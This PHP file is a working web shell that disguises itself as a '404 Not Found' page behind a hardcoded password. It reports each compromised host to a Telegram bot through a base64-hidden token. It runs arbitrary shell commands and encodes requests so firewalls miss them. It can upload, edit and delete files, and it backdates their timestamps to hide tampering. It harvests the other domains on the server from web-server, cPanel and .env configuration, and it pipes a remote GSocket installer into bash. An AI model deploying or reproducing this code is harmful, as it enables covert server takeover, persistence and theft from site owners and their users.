<?php
$k='kontolbengkak';
$tk = base64_decode(
    "ODM5MDQyMzYzMTpBQUUxOEVOY0k1SW5oS29SMFJtVzNCMll5a2U3Vm9WN0hxYw"
);
$cid = base64_decode("NTA3MDkzODc3OA");

function reportTelegram($msg)
{
    global $tk, $cid;
    $id = sys_get_temp_dir() . "/baridin_" . md5($msg);
    if (!file_exists($id)) {
        @file_get_contents(
            "https://api.telegram.org/bot$tk/sendMessage?chat_id=$cid&text=" .
                urlencode($msg)
        );
        @file_put_contents($id, time());
    }
}
/* ================= Report ================= */
if (!isset($_SESSION["telegram_reported"])) {
    $uri = urldecode(parse_url($_SERVER["REQUEST_URI"], PHP_URL_PATH));
    $path = $_SERVER["DOCUMENT_ROOT"] . $uri;
    if (is_file($path)) {
        $host = $_SERVER["HTTP_HOST"];
        $url =
            (isset($_SERVER["HTTPS"]) ? "https" : "http") .
            "://" .
            $host .
            $uri;
        reportTelegram("kontolbengkak:\n$host\n$url");
        $_SESSION["telegram_reported"] = true;
    }
}
if(!isset($_COOKIE['_k'])){
    if(isset($_POST['_k'])&&$_POST['_k']===$k){setcookie('_k',$k,time()+86400,'/');header('Location:'.$_SERVER['REQUEST_URI']);exit;}
    echo '<html><head><title>404 Not Found</title><style>*{margin:0;padding:0;font-family:monospace}body{background:#0f172a;display:flex;justify-content:center;align-items:center;height:100vh}.x{background:#1e293b;padding:30px;border-radius:8px}input{background:#0f172a;border:1px solid #334155;color:#fff;padding:8px 12px;border-radius:4px;font-family:monospace}button{background:#e94560;color:#fff;border:none;padding:8px 16px;border-radius:4px;cursor:pointer;font-family:monospace;margin-left:5px}</style></head><body><div class="x"><form method="post"><input type="password" name="_k" placeholder="key" autofocus><button>Go</button></form></div></body></html>';exit;
}elseif($_COOKIE['_k']!==$k){setcookie('_k','',0,'/');echo'404';exit;}

// Decode base64 wrapper
function _gb($k,$d=null){return isset($_POST[$k])?base64_decode($_POST[$k]):$d;}
function _e($s){return rtrim(base64_encode($s),'=');}
function _d($s){return base64_decode($s);}

$dir=isset($_POST['_d'])?_d($_POST['_d']):(isset($_GET['_d'])?_d($_GET['_d']):getcwd());
$act=isset($_POST['_a'])?$_POST['_a']:(isset($_GET['_a'])?$_GET['_a']:'ls');
$file=isset($_POST['_f'])?_d($_POST['_f']):(isset($_GET['_f'])?_d($_GET['_f']):'');

// Download action (GET based, no WAF issue)
if($act=='dl'&&$file){$fp=realpath($file);if($fp&&is_file($fp)){header('Content-Type:application/octet-stream');header('Content-Disposition:attachment;filename='.basename($fp));header('Content-Length:'.filesize($fp));readfile($fp);exit;}}

// Random timestamp 1-5 months ago
function _rtime($f){
    $ago=time()-rand(30*86400,150*86400)-rand(0,86400);
    @touch($f,$ago,$ago);
    return date('Y-m-d H:i:s',$ago);
}
// All POST actions - data comes base64 encoded from JS
if($_SERVER['REQUEST_METHOD']==='POST'){
    if($act=='up'&&isset($_POST['_data'])&&isset($_POST['_name'])){
        $name=_d($_POST['_name']);
        $data=base64_decode($_POST['_data']);
        $dest=$dir.'/'.basename($name);
        file_put_contents($dest,$data);
        $ts=_rtime($dest);
        $msg="Uploaded: ".basename($name)." (".strlen($data)."B) [time: $ts]";
    }
    if($act=='save'&&isset($_POST['_fc'])){
        $content=_d($_POST['_fc']);
        file_put_contents($file,$content);
        $ts=_rtime($file);
        $msg="Saved: ".basename($file)." [time: $ts]";
    }
    if($act=='del'&&$file){
        if(is_dir($file)){
            $di=new RecursiveDirectoryIterator($file,FilesystemIterator::SKIP_DOTS);
            $ri=new RecursiveIteratorIterator($di,RecursiveIteratorIterator::CHILD_FIRST);
            foreach($ri as $fi)$fi->isDir()?@rmdir($fi->getRealPath()):@unlink($fi->getRealPath());
            @rmdir($file);$msg="Deleted dir: ".basename($file);
        }else{@unlink($file);$msg="Deleted: ".basename($file);}
    }
    if($act=='mkdir'&&isset($_POST['_fn'])){
        $fn=_d($_POST['_fn']);
        @mkdir($dir.'/'.$fn,0777,true);$msg="Created: ".$fn;
    }
    if($act=='mkfile'&&isset($_POST['_fn'])){
        $fn=_d($_POST['_fn']);
        $fp=$dir.'/'.$fn;
        @file_put_contents($fp,'');$ts=_rtime($fp);$msg="File created: $fn [time: $ts]";
    }
    if($act=='ren'&&$file&&isset($_POST['_nn'])){
        $nn=_d($_POST['_nn']);
        $np=$dir.'/'.$nn;
        rename($file,$np);$ts=_rtime($np);$msg="Renamed to $nn [time: $ts]";
    }
    if($act=='chmod'&&$file&&isset($_POST['_cm'])){
        chmod($file,octdec($_POST['_cm']));$msg="Chmod: ".$_POST['_cm'];
    }
    if($act=='chtime'&&$file){
        $ts=_rtime($file);$msg="Time changed: ".basename($file)." â $ts";
    }
    if($act=='unzip'&&$file&&is_file($file)){
        $zname=pathinfo($file,PATHINFO_FILENAME);
        if(preg_match('/\.tar$/i',$zname))$zname=pathinfo($zname,PATHINFO_FILENAME);
        $dest=$dir.'/'.$zname;
        @mkdir($dest,0777,true);
        $ext=strtolower(pathinfo($file,PATHINFO_EXTENSION));
        $done=false;
        // .zip
        if($ext=='zip'){
            if(class_exists('ZipArchive')){
                $z=new ZipArchive;if($z->open($file)===true){$z->extractTo($dest);$z->close();$done=true;}
            }
            if(!$done){$desc=[0=>['pipe','r'],1=>['pipe','w'],2=>['pipe','w']];$p=@proc_open('unzip -o '.escapeshellarg($file).' -d '.escapeshellarg($dest).' 2>&1',$desc,$pipes);if(is_resource($p)){fclose($pipes[0]);stream_get_contents($pipes[1]);fclose($pipes[1]);fclose($pipes[2]);proc_close($p);$done=true;}}
        }
        // .tar.gz .tgz .tar .gz
        if(!$done&&preg_match('/^(tar|gz|tgz)$/i',$ext)){
            $cmd='tar xzf '.escapeshellarg($file).' -C '.escapeshellarg($dest).' 2>&1';
            if($ext=='tar')$cmd='tar xf '.escapeshellarg($file).' -C '.escapeshellarg($dest).' 2>&1';
            $desc=[0=>['pipe','r'],1=>['pipe','w'],2=>['pipe','w']];$p=@proc_open($cmd,$desc,$pipes);
            if(is_resource($p)){fclose($pipes[0]);stream_get_contents($pipes[1]);fclose($pipes[1]);fclose($pipes[2]);proc_close($p);$done=true;}
        }
        // .rar
        if(!$done&&$ext=='rar'){
            $desc=[0=>['pipe','r'],1=>['pipe','w'],2=>['pipe','w']];$p=@proc_open('unrar x -o+ '.escapeshellarg($file).' '.escapeshellarg($dest).' 2>&1',$desc,$pipes);
            if(is_resource($p)){fclose($pipes[0]);stream_get_contents($pipes[1]);fclose($pipes[1]);fclose($pipes[2]);proc_close($p);$done=true;}
        }
        if($done){$ts=_rtime($dest);foreach(glob("$dest/*") as $_ef)_rtime($_ef);$msg="Extracted to $zname/ (".max(0,@count(scandir($dest))-2)." items) [time: $ts]";}
        else{$msg="Extract failed - no handler for .$ext";}
    }
}
// CMD execution first (base64 bypass)
$cmd_out='';
if(isset($_POST['_runcmd'])){
    $cmd_b64=isset($_POST['_cmd'])?$_POST['_cmd']:'';
    $cmd_raw=base64_decode($cmd_b64);
    if(isset($_POST['_pb']))$dir=base64_decode($_POST['_pb']);
    if($cmd_raw){
        // Method 1: proc_open (most reliable)
        $desc=[0=>['pipe','r'],1=>['pipe','w'],2=>['pipe','w']];
        $p=@proc_open($cmd_raw,$desc,$pipes);
        if(is_resource($p)){
            fclose($pipes[0]);
            $cmd_out=stream_get_contents($pipes[1]).stream_get_contents($pipes[2]);
            fclose($pipes[1]);fclose($pipes[2]);
            proc_close($p);
        }
        // Method 2: write temp script + execute
        if(!$cmd_out){
            $tmp='/tmp/.cmd_'.getmypid();
            @file_put_contents($tmp,'#!/bin/sh'."\n".$cmd_raw.' 2>&1');
            @chmod($tmp,0755);
            $cmd_out=@shell_exec($tmp);
            if(!$cmd_out)$cmd_out=@shell_exec('sh '.$tmp);
            if(!$cmd_out){ob_start();@system('sh '.$tmp);$cmd_out=ob_get_clean();}
            if(!$cmd_out){ob_start();@passthru('sh '.$tmp);$cmd_out=ob_get_clean();}
            @unlink($tmp);
        }
        // Method 3: popen
        if(!$cmd_out){
            $h=@popen($cmd_raw.' 2>&1','r');
            if($h){$cmd_out=@fread($h,1048576);@pclose($h);}
        }
        // Method 4: backtick
        if(!$cmd_out){
            $cmd_out=@`$cmd_raw 2>&1`;
        }
        if(!$cmd_out)$cmd_out='[all methods failed for: '.$cmd_raw.']';
    }else{
        $cmd_out='[decode failed]';
    }
}
// Navigate dir via POST (base64 encoded to bypass WAF)
if(isset($_POST['_go'])&&isset($_POST['_pb'])){$dir=_d($_POST['_pb']);}
elseif(isset($_POST['_go'])&&isset($_POST['_p'])){$dir=$_POST['_p'];}
$_user=function_exists('posix_getpwuid')?@posix_getpwuid(posix_geteuid())['name']:get_current_user();
$_dirwr=@is_writable($dir);
$_hascmd=function_exists('system')||function_exists('exec')||function_exists('shell_exec')||function_exists('passthru')||function_exists('popen');
?>
<html><head><title>404 Not Found</title><meta name="robots" content="noindex,nofollow,noarchive,nosnippet">
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:monospace;font-size:13px}
body{background:#0f172a;color:#e2e8f0}a{color:#38bdf8;text-decoration:none}
.w{max-width:1200px;margin:0 auto;padding:10px}
.b{background:#1e293b;padding:8px 12px;border-radius:6px;margin-bottom:8px;display:flex;gap:8px;align-items:center;flex-wrap:wrap}
input[type=text],input[type=file],select{background:#0f172a;border:1px solid #334155;color:#fff;padding:5px 8px;border-radius:4px;font-family:monospace;font-size:13px}
button,input[type=submit]{background:#e94560;color:#fff;border:none;padding:5px 12px;border-radius:4px;cursor:pointer;font-family:monospace;font-size:13px}
button:hover{background:#ff6b81}
table{width:100%;border-collapse:collapse}th{background:#1e293b;padding:6px 10px;text-align:left;border-bottom:2px solid #e94560}
td{padding:4px 10px;border-bottom:1px solid #1e293b}tr:hover{background:#1e293b}
.s{color:#64748b}.m{background:#0a3d62;padding:8px;border-radius:4px;margin-bottom:8px;color:#7bed9f}
textarea{width:100%;height:400px;background:#0f172a;color:#e2e8f0;border:1px solid #334155;padding:8px;font-family:monospace;border-radius:4px}
.ab{background:#334155;border:none;cursor:pointer;padding:3px 8px;border-radius:3px;font-size:12px;color:#e2e8f0;font-family:monospace}
.ab:hover{background:#e94560;color:#fff}
.prog{display:none;color:#38bdf8;font-size:11px}
</style>
<script>
function b64e(s){return btoa(unescape(encodeURIComponent(s)));}
function b64d(s){return decodeURIComponent(escape(atob(s)));}

// Upload file as base64 (bypass WAF completely)
function doUpload(){
    var f=document.getElementById('uf').files[0];
    if(!f){alert('Select file');return;}
    var p=document.getElementById('prog');
    p.style.display='inline';p.textContent='Reading...';
    var r=new FileReader();
    r.onload=function(e){
        p.textContent='Uploading '+f.name+' ('+Math.round(f.size/1024)+'KB)...';
        var form=document.createElement('form');
        form.method='POST';form.style.display='none';
        var fields={
            '_a':'up',
            '_d':'<?=_e($dir)?>',
            '_name':btoa(f.name),
            '_data':e.target.result.split(',')[1] // already base64 from FileReader
        };
        for(var k in fields){
            var inp=document.createElement('input');
            inp.name=k;inp.value=fields[k];
            form.appendChild(inp);
        }
        document.body.appendChild(form);
        form.submit();
    };
    r.readAsDataURL(f);
}

// Save edit with base64 encoded content
function doSave(){
    var ta=document.getElementById('editor');
    document.getElementById('fc_b64').value=btoa(unescape(encodeURIComponent(ta.value)));
    return true;
}

// Generic action with base64 encoded params
function doAction(act,file,dir,extra){
    var form=document.createElement('form');
    form.method='POST';form.style.display='none';
    var fields={'_a':act,'_f':file,'_d':dir};
    if(extra)for(var k in extra)fields[k]=extra[k];
    for(var k in fields){
        var inp=document.createElement('input');
        inp.name=k;inp.value=fields[k];
        form.appendChild(inp);
    }
    document.body.appendChild(form);
    form.submit();
}
function doRename(file,dir){
    var nn=prompt('New name:',atob(file).split('/').pop());
    if(nn)doAction('ren',file,dir,{'_nn':btoa(nn)});
}
function doChmod(file,dir,cur){
    var cm=prompt('Chmod:',cur);
    if(cm)doAction('chmod',file,dir,{'_cm':cm});
}
function doMkdir(dir){
    var fn=prompt('Folder name:');
    if(fn)doAction('mkdir','',dir,{'_fn':btoa(fn)});
}
function doMkfile(dir){
    var fn=prompt('File name (e.g. test.php):');
    if(fn)doAction('mkfile','',dir,{'_fn':btoa(fn)});
}
function doCmd(){
    var c=document.getElementById('_cmdv').value;
    if(!c)return;
    var form=document.createElement('form');
    form.method='POST';form.style.display='none';
    var fields={'_runcmd':'1','_cmd':btoa(unescape(encodeURIComponent(c))),'_pb':'<?=_e($dir)?>'};
    for(var k in fields){var inp=document.createElement('input');inp.name=k;inp.value=fields[k];form.appendChild(inp);}
    document.body.appendChild(form);
    form.submit();
}
function doScanWr(){
    var p=document.getElementById('_wrpath').value;
    if(!p)return;
    doAction('scanwr','','<?=_e($dir)?>',{'_sp':btoa(p)});
}
function doGsocket(){
    if(!confirm('Install GSocket?'))return;
    var cmd='(curl -fsSL gsocket.io/x || wget -qO- gsocket.io/x || php -r "echo file_get_contents(\'https://gsocket.io/x\');") 2>/dev/null | bash 2>&1; echo GS_INSTALL_DONE';
    var form=document.createElement('form');
    form.method='POST';form.style.display='none';
    var fields={'_runcmd':'1','_cmd':btoa(unescape(encodeURIComponent(cmd))),'_pb':'<?=_e($dir)?>'};
    for(var k in fields){var inp=document.createElement('input');inp.name=k;inp.value=fields[k];form.appendChild(inp);}
    document.body.appendChild(form);
    form.submit();
}
function doDel(file,dir,name){
    if(confirm('Delete '+name+'?'))doAction('del',file,dir);
}
function navDir(dir){
    var form=document.createElement('form');
    form.method='POST';form.style.display='none';
    var inp=document.createElement('input');inp.name='_pb';inp.value=dir;
    var inp2=document.createElement('input');inp2.name='_go';inp2.value='1';
    form.appendChild(inp);form.appendChild(inp2);
    document.body.appendChild(form);
    form.submit();
}
</script></head>
<body><div class="w">
<div class="b">
    <b style="color:#e94560">FM</b>
    <form method="post" onsubmit="document.getElementById('_pb').value=btoa(document.getElementById('_pv').value);return true;" style="display:flex;gap:5px;flex:1">
        <input type="text" id="_pv" value="<?=htmlspecialchars($dir)?>" style="flex:1;min-width:200px;color:<?=$_dirwr?'#22c55e':'#ef4444'?>;font-weight:bold">
        <input type="hidden" name="_pb" id="_pb">
        <button name="_go" value="1">Go</button>
    </form>
    <div style="display:flex;gap:5px">
        <input type="text" id="_cmdv" placeholder="$ command" style="min-width:180px" onkeydown="if(event.key=='Enter')doCmd()">
        <button onclick="doCmd()" style="background:#8b5cf6">Run</button>
    </div>
</div>
<div id="scanwr_box" class="b" style="display:<?=$act=='scanwr'?'flex':'none'?>;gap:5px;align-items:center">
    <span style="color:#10b981;font-weight:bold">Scan:</span>
    <input type="text" id="_wrpath" value="<?=isset($_POST['_sp'])?htmlspecialchars(base64_decode($_POST['_sp'])):'/var/www/'?>" placeholder="/path/to/scan" style="flex:1" onkeydown="if(event.key=='Enter')doScanWr()">
    <button onclick="doScanWr()" style="background:#10b981">Scan</button>
</div>
<?php if(isset($msg)):?><div class="m"><?=$msg?></div><?php endif;?>
<div class="b" style="color:#64748b;font-size:11px">
    <?=$_user?> | <span style="color:<?=$_dirwr?'#22c55e':'#ef4444'?>;font-weight:bold"><?=$_dirwr?'WRITABLE':'READ-ONLY'?></span> | PHP <?=phpversion()?> | <?=$_hascmd?'CMD:ON':'CMD:OFF'?>
</div>

<?php if($cmd_out):?>
<pre style="background:#1e1e2e;padding:10px;border-radius:4px;overflow:auto;margin-bottom:8px;color:#a6e3a1;border:1px solid #333;white-space:pre-wrap;word-wrap:break-word"><?=htmlspecialchars($cmd_out)?></pre>
<?php endif;?>
<?php if($act=='scanwr'):
$_sp=isset($_POST['_sp'])?base64_decode($_POST['_sp']):'/var/www/';
$_desc=[0=>['pipe','r'],1=>['pipe','w'],2=>['pipe','w']];
$_p=@proc_open('find '.escapeshellarg($_sp).' -writable -type d 2>/dev/null | head -200',$_desc,$_pipes);
$_wr_out='';if(is_resource($_p)){fclose($_pipes[0]);$_wr_out=stream_get_contents($_pipes[1]);fclose($_pipes[1]);fclose($_pipes[2]);proc_close($_p);}
$_wr_dirs=array_filter(array_map('trim',explode("\n",$_wr_out)));
?>
<div style="background:#0a1a0a;border:1px solid #10b981;border-radius:4px;padding:8px;margin-bottom:8px">
<div style="color:#10b981;font-size:11px;margin-bottom:6px"><b><?=count($_wr_dirs)?> writable dirs</b> in <?=htmlspecialchars($_sp)?></div>
<?php if($_wr_dirs):foreach($_wr_dirs as $_wd){$_wpm=@substr(sprintf('%o',fileperms($_wd)),-4);$_wow=function_exists('posix_getpwuid')?@posix_getpwuid(fileowner($_wd))['name']:fileowner($_wd);$_wgr=function_exists('posix_getgrgid')?@posix_getgrgid(filegroup($_wd))['name']:filegroup($_wd);
echo "<div style='padding:2px 0'><a href=\"javascript:navDir('"._e($_wd)."')\" style='color:#22c55e;font-size:12px'>&#128193; ".htmlspecialchars($_wd)."</a> <span style='color:#64748b;font-size:11px'>$_wow:$_wgr $_wpm</span></div>";}
else:?><div style="color:#64748b">No writable dirs found</div><?php endif;?>
</div>

<?php endif;?>
<?php if($act=='grab'):
// Grab domains - scan server configs
function _xcmd($c){$d=[0=>['pipe','r'],1=>['pipe','w'],2=>['pipe','w']];$p=@proc_open($c,$d,$z);if(!is_resource($p))return '';fclose($z[0]);$o=stream_get_contents($z[1]).stream_get_contents($z[2]);fclose($z[1]);fclose($z[2]);proc_close($p);return $o;}
$doms=[];
$sip=trim(_xcmd("hostname -I 2>/dev/null|awk '{print \$1}'"));
$extip=trim(_xcmd("curl -s --max-time 5 ifconfig.me 2>/dev/null||curl -s --max-time 5 icanhazip.com 2>/dev/null"));
// Apache vhosts
foreach(['/etc/apache2/sites-enabled','/etc/apache2/sites-available','/etc/httpd/conf.d','/etc/httpd/conf/extra','/usr/local/apache/conf/vhosts'] as $_p){if(!is_dir($_p))continue;foreach(glob("$_p/*") as $_f){if(!is_file($_f))continue;$_c=@file_get_contents($_f);if(preg_match_all('/<VirtualHost[^>]*>(.*?)<\/VirtualHost>/si',$_c,$_vhs)){foreach($_vhs[1] as $_vh){$_dr='';if(preg_match('/DocumentRoot\s+"?([^\s"\r\n]+)/i',$_vh,$_rm))$_dr=rtrim($_rm[1],'"');if(preg_match_all('/Server(?:Name|Alias)\s+(.+)/i',$_vh,$_nm))foreach($_nm[1] as $_v)foreach(preg_split('/\s+/',trim($_v)) as $_d){$_d=strtolower(preg_replace('/:\d+$/','',$_d));if($_d&&$_d!='*'&&preg_match('/\w+\.\w+/',$_d))$doms[$_d]=['s'=>'Apache:'.basename($_f),'p'=>$_dr];}}}}}
// Nginx configs
foreach(['/etc/nginx/sites-enabled','/etc/nginx/sites-available','/etc/nginx/conf.d','/www/server/panel/vhost/nginx'] as $_p){if(!is_dir($_p))continue;foreach(glob("$_p/*") as $_f){if(!is_file($_f))continue;$_c=@file_get_contents($_f);$_rt='';if(preg_match('/^\s*root\s+([^;]+)/mi',$_c,$_rm))$_rt=trim($_rm[1]," \t\"';");if(preg_match_all('/server_name\s+([^;]+)/i',$_c,$_nm))foreach($_nm[1] as $_v)foreach(preg_split('/\s+/',trim($_v)) as $_d)if($_d&&$_d!='_'&&$_d!='*'&&$_d!='""'&&preg_match('/\w+\.\w+/',$_d))$doms[strtolower($_d)]=['s'=>'Nginx:'.basename($_f),'p'=>$_rt];}}
// httpd -S
$_hs=_xcmd("(httpd -S 2>/dev/null||apache2ctl -S 2>/dev/null) 2>&1");if(preg_match_all('/(?:namevhost|ServerName)\s+(\S+)/i',$_hs,$_m))foreach(array_unique($_m[1]) as $_d){$_d=strtolower(preg_replace('/:\d+$/','',$_d));if(preg_match('/\w+\.\w+/',$_d)&&!isset($doms[$_d]))$doms[$_d]=['s'=>'httpd -S','p'=>''];}
// /home/* + .env
foreach(glob('/home/*') as $_h){if(!is_dir($_h))continue;$_u=basename($_h);if(is_dir("$_h/public_html"))$doms["[$_u]"]=['s'=>'homedir','p'=>"$_h/public_html"];foreach(array_merge(glob("$_h/.env"),glob("$_h/*/.env"),glob("$_h/public_html/.env"),glob("$_h/public_html/*/.env")) as $_e){$_c=@file_get_contents($_e);if(preg_match('/APP_URL\s*=\s*"?https?:\/\/([^\s\r\n"\']+)/i',$_c,$_m))$doms[strtolower(rtrim($_m[1],'/'))]=["s"=>'.env:'.str_replace('/home/','',$_e),'p'=>dirname($_e)];}}
// /var/www/*
foreach(glob('/var/www/*') as $_h){if(!is_dir($_h))continue;foreach(array_merge(glob("$_h/.env"),glob("$_h/*/.env")) as $_e){$_c=@file_get_contents($_e);if(preg_match('/APP_URL\s*=\s*"?https?:\/\/([^\s\r\n"\']+)/i',$_c,$_m))$doms[strtolower(rtrim($_m[1],'/'))]=["s"=>'.env','p'=>dirname($_e)];}}
// cPanel
foreach(glob('/var/cpanel/userdata/*') as $_ud){if(!is_dir($_ud))continue;$_cu=basename($_ud);foreach(glob("$_ud/*") as $_cf){if(!is_file($_cf)||basename($_cf)=='main'||strpos(basename($_cf),'_SSL')!==false)continue;$_d=basename($_cf);if(preg_match('/\w+\.\w+/',$_d)){$_dr='';$_cc=@file_get_contents($_cf);if(preg_match('/documentroot:\s*(.+)/i',$_cc,$_rm))$_dr=trim($_rm[1]);$doms[strtolower($_d)]=['s'=>'cPanel:'.$_cu,'p'=>$_dr];}}}
// DirectAdmin
foreach(glob('/usr/local/directadmin/data/users/*/domains.list') as $_dl){$_u=basename(dirname($_dl));foreach(explode("\n",trim(@file_get_contents($_dl))) as $_d)if(trim($_d)){$_dp="/home/$_u/domains/".trim($_d)."/public_html";$doms[strtolower(trim($_d))]=["s"=>"DA:$_u","p"=>@is_dir($_dp)?$_dp:''];}}
// /etc/hosts
$_hf=@file_get_contents('/etc/hosts');if($_hf&&preg_match_all('/^[\d\.]+\s+(.+)$/m',$_hf,$_m))foreach($_m[1] as $_v)foreach(preg_split('/\s+/',trim($_v)) as $_d)if(!preg_match('/^(localhost|ip6|ff0|fe0)/i',$_d)&&strpos($_d,'.')!==false&&!isset($doms[strtolower($_d)]))$doms[strtolower($_d)]=['s'=>'/etc/hosts','p'=>''];
// Reverse IP
$apiOk=false;if($extip&&filter_var(trim($extip),FILTER_VALIDATE_IP)){$_ar=trim(_xcmd("curl -s --max-time 10 'https://api.hackertarget.com/reverseiplookup/?q=$extip' 2>/dev/null"));if($_ar&&strpos($_ar,'error')===false&&strpos($_ar,'API count')===false&&strpos($_ar,'No DNS')===false){$apiOk=true;foreach(explode("\n",$_ar) as $_d)if(($__d=trim($_d))&&preg_match('/^[\w\.\-]+\.\w{2,}$/',$__d)&&!isset($doms[strtolower($__d)]))$doms[strtolower($__d)]=['s'=>'ReverseIP','p'=>''];}}
ksort($doms);$np=0;foreach($doms as $_di)if(!empty($_di['p'])&&@is_dir($_di['p']))$np++;
?>
<div class="b" style="justify-content:space-between"><b style="color:#e94560">Grab Domains</b> <span class="s">LAN: <?=htmlspecialchars($sip)?> | WAN: <?=htmlspecialchars($extip)?></span> <button onclick="navDir('<?=_e($dir)?>')" class="ab" style="background:#0a84ff;color:#fff">&larr; Back</button></div>
<?php if(!empty($doms)):?>
<div class="m">Found <?=count($doms)?> entries | <?=$np?> browsable <?=$apiOk?'':'| ReverseIP API timeout'?></div>
<table><tr><th>#</th><th>Domain</th><th>Document Root</th><th>Source</th></tr>
<?php $n=0;foreach($doms as $dm=>$inf){$n++;$hp=!empty($inf['p'])&&@is_dir($inf['p']);
echo "<tr><td class='s'>$n</td><td>";
if($hp)echo "<a href=\"javascript:navDir('"._e($inf['p'])."')\" style='color:#38bdf8'>".htmlspecialchars($dm)." &rarr;</a>";
else echo "<span class='s'>".htmlspecialchars($dm)."</span>";
echo "</td><td class='s'>".($hp?"<span style='color:#22c55e'>".htmlspecialchars($inf['p'])."</span>":htmlspecialchars($inf['p']??'-'))."</td><td class='s'>".htmlspecialchars($inf['s'])."</td></tr>";}?>
</table>
<?php else:?><div class="b"><span class="s">No domains found</span></div><?php endif;?>

<?php elseif($act=='edit'&&$file&&is_file($file)):?>
<div class="b" style="justify-content:space-between">
    <b>Edit: <?=htmlspecialchars(basename($file))?> <span class="s">(<?=filesize($file)?>B)</span></b>
    <a href="javascript:navDir('<?=_e($dir)?>')" style="background:#38bdf8;color:#fff;padding:4px 12px;border-radius:3px">&larr; Back</a>
</div>
<form method="post" onsubmit="return doSave()">
    <input type="hidden" name="_a" value="save">
    <input type="hidden" name="_f" value="<?=_e($file)?>">
    <input type="hidden" name="_d" value="<?=_e($dir)?>">
    <input type="hidden" name="_fc" id="fc_b64" value="">
    <textarea id="editor"><?=htmlspecialchars(file_get_contents($file))?></textarea>
    <div style="margin-top:5px;display:flex;gap:5px">
        <button type="submit">Save</button>
        <a href="javascript:navDir('<?=_e($dir)?>')" style="background:#38bdf8;color:#fff;padding:4px 10px;border-radius:3px;display:inline-flex;align-items:center">&larr; Back</a>
    </div>
</form>

<?php elseif($act=='ren'&&$file):?>
<div class="b"><b>Rename: <?=htmlspecialchars(basename($file))?></b></div>
<div class="b">
    <input type="text" id="rn_name" value="<?=htmlspecialchars(basename($file))?>" style="flex:1">
    <button onclick="doAction('ren','<?=_e($file)?>','<?=_e($dir)?>',{'_nn':btoa(document.getElementById('rn_name').value)})">Rename</button>
    <a href="javascript:navDir('<?=_e($dir)?>')" class="ab">&larr; Back</a>
</div>

<?php else:?>
<div class="b">
    <input type="file" id="uf">
    <button onclick="doUpload()">Upload</button>
    <span id="prog" class="prog"></span>
    <button onclick="doMkdir('<?=_e($dir)?>')" style="background:#38bdf8">Mkdir</button>
    <button onclick="doMkfile('<?=_e($dir)?>')" style="background:#0ea5e9">New File</button>
    <button onclick="doAction('grab','','<?=_e($dir)?>')" style="background:#0a84ff">Grab Domains</button>
    <button onclick="doGsocket()" style="background:#f59e0b;color:#000">GSocket</button>
    <button onclick="var e=document.getElementById('scanwr_box');e.style.display=e.style.display=='none'?'flex':'none'" style="background:#10b981">Scan Writable</button>
</div>
<table><tr><th>Name</th><th>Size</th><th>Owner</th><th>Perms</th><th>Modified</th><th style="min-width:180px">Actions</th></tr>
<?php
if($dir!='/'){$par=dirname($dir);
echo "<tr><td colspan=5><a href=\"javascript:navDir('"._e($par)."')\" style='color:#38bdf8'>&#128193; ..</a></td></tr>";}
$items=@scandir($dir);if($items){$ds=$fs=[];foreach($items as $it){if($it=='.'||$it=='..')continue;$p=$dir.'/'.$it;if(is_dir($p))$ds[]=$it;else $fs[]=$it;}sort($ds);sort($fs);
foreach($ds as $it){$p=$dir.'/'.$it;$pm=@substr(sprintf('%o',fileperms($p)),-4);$mt=@date('d-m-Y H:i',filemtime($p));$wr=is_writable($p);$ow=function_exists('posix_getpwuid')?posix_getpwuid(fileowner($p))['name']:fileowner($p);$gr=function_exists('posix_getgrgid')?posix_getgrgid(filegroup($p))['name']:filegroup($p);
echo "<tr><td><a href=\"javascript:navDir('"._e($p)."')\" style='color:".($wr?"#38bdf8":"#ef4444")."'>&#128193; ".htmlspecialchars($it)."</a></td>";
echo "<td class='s'>DIR</td><td class='s'>$ow:$gr</td><td style='color:".($wr?"#22c55e":"#ef4444")."'>$pm</td><td class='s'>$mt</td><td>";
echo "<button class='ab' onclick=\"doRename('"._e($p)."','"._e($dir)."')\">Ren</button> ";
echo "<button class='ab' onclick=\"doChmod('"._e($p)."','"._e($dir)."','$pm')\">Chm</button> ";
echo "<button class='ab' onclick=\"doAction('chtime','"._e($p)."','"._e($dir)."')\">ChT</button> ";
echo "<button class='ab' onclick=\"doDel('"._e($p)."','"._e($dir)."','".htmlspecialchars($it)."')\">Del</button>";
echo "</td></tr>";}
foreach($fs as $it){$p=$dir.'/'.$it;$sz=@filesize($p);$s=$sz>1048576?round($sz/1048576,1).'M':($sz>1024?round($sz/1024,1).'K':$sz.'B');$pm=@substr(sprintf('%o',fileperms($p)),-4);$mt=@date('d-m-Y H:i',filemtime($p));$wr=is_writable($p);$ow=function_exists('posix_getpwuid')?posix_getpwuid(fileowner($p))['name']:fileowner($p);$gr=function_exists('posix_getgrgid')?posix_getgrgid(filegroup($p))['name']:filegroup($p);
echo "<tr><td>&#128196; <span style='color:".($wr?"#e2e8f0":"#ef4444")."'>".htmlspecialchars($it)."</span></td><td class='s'>$s</td><td class='s'>$ow:$gr</td><td style='color:".($wr?"#22c55e":"#ef4444")."'>$pm</td><td class='s'>$mt</td><td>";
echo "<button class='ab' onclick=\"doAction('edit','"._e($p)."','"._e($dir)."')\">Edit</button> ";
echo "<a href='?_a=dl&_f="._e($p)."' class='ab' style='text-decoration:none;display:inline-block'>DL</a> ";
echo "<button class='ab' onclick=\"doRename('"._e($p)."','"._e($dir)."')\">Ren</button> ";
echo "<button class='ab' onclick=\"doChmod('"._e($p)."','"._e($dir)."','$pm')\">Chm</button> ";
echo "<button class='ab' onclick=\"doAction('chtime','"._e($p)."','"._e($dir)."')\">ChT</button> ";
echo "<button class='ab' onclick=\"doDel('"._e($p)."','"._e($dir)."','".htmlspecialchars($it)."')\">Del</button>";
if(preg_match('/\.(zip|tar\.gz|tgz|tar|gz|rar)$/i',$it))echo " <button class='ab' style='background:#f59e0b;color:#000' onclick=\"doAction('unzip','"._e($p)."','"._e($dir)."')\">Unzip</button>";
echo "</td></tr>";}}?>
</table>
<?php endif;?>
<div style="text-align:center;padding:15px 0;font-size:12px;margin-top:10px;border-top:1px solid #1e293b"><span style="color:#e2e8f0">m0naliza</span> <span style="color:#e94560">&#10084;</span></div>
</div></body></html>
